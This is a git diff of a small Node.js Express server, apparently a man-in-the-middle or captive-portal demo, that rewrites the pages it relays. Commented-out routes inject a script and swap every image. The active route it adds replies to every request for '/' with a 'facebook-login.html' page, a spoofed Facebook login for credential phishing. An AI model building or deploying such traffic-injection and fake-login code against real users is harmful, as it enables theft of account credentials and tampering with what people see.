@@ -4,7 +4,6 @@ const path    = require('path');
 const fetch   = require('node-fetch');
 const cheerio = require('cheerio')
 
-
 app.set('port', (process.env.PORT || 8080));
 
 // Status
@@ -13,7 +12,7 @@ app.get('/ping', (req, res) => {
 });
 
 
-/**** Inject code html ****/
+/**** Code Injection ****/
 // app.get('/', async (request, response) => {
 //   const SCRIPT_TO_ADD = 'alert("code added!");';
 
@@ -32,9 +31,11 @@ app.get('/ping', (req, res) => {
 // });
 
 
-/**** Modify html (insert image) ****/
+
+/**** Image Injection  ****/
 // app.get('/', async (request, response) => {
-//   const IMAGE_TO_REPLACE = 'https://media.lmneuquen.com/adjuntos/195/imagenes/003/563/0003563137.jpg';
+//   // const IMAGE_TO_REPLACE = 'https://media.lmneuquen.com/adjuntos/195/imagenes/003/563/0003563137.jpg';
+//   const IMAGE_TO_REPLACE = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTYUR6eER5dHC5V-uc9uat18eX-rXlmvAkvqQZ6IL7BjNChuXLg";
 
 //   const url = request.protocol + '://' + request.get('host') + request.originalUrl;
 //   console.log("Client request received", url)
@@ -42,21 +43,33 @@ app.get('/ping', (req, res) => {
 //   const fetchedResponse = await fetch(url);
 //   const html = await fetchedResponse.text();
 
-  // console.log("Replacing image");
-  // const regex = new RegExp('img src=".+"', 'g');
-//   const replaced = html.replace(regex, `img src="${IMAGE_TO_REPLACE}"`);
+//   console.log("Replacing image");
+//   const regex = new RegExp('<img (.+?)src="[^"]+"', 'gi');
+//   const replaced = html.replace(regex, `<img src="${IMAGE_TO_REPLACE}"`);
 
 //   response.send(replaced);
 // });
 
 
-/**** Inject html ****/
+
+/**** HTML Login Injection ****/
+// app.get('/', async (request, response) => {
+//   const url = request.protocol + '://' + request.get('host') + request.originalUrl;
+//   console.log("Client request received", url)
+
+//   console.log("Replacing whole html");
+//   response.sendFile(path.join(__dirname+'/login.html'));
+// });
+
+
+
+/*** Facebook Login HTML Injection  ***/
 app.get('/', async (request, response) => {
   const url = request.protocol + '://' + request.get('host') + request.originalUrl;
   console.log("Client request received", url)
 
-  console.log("Replacing whole html");
-  response.sendFile(path.join(__dirname+'/login.html'));
+  console.log("Sending Facebook html");
+  response.sendFile(path.join(__dirname+'/facebook-login.html'));
 });
 
 app.get('/login.html', async (request, response) => {
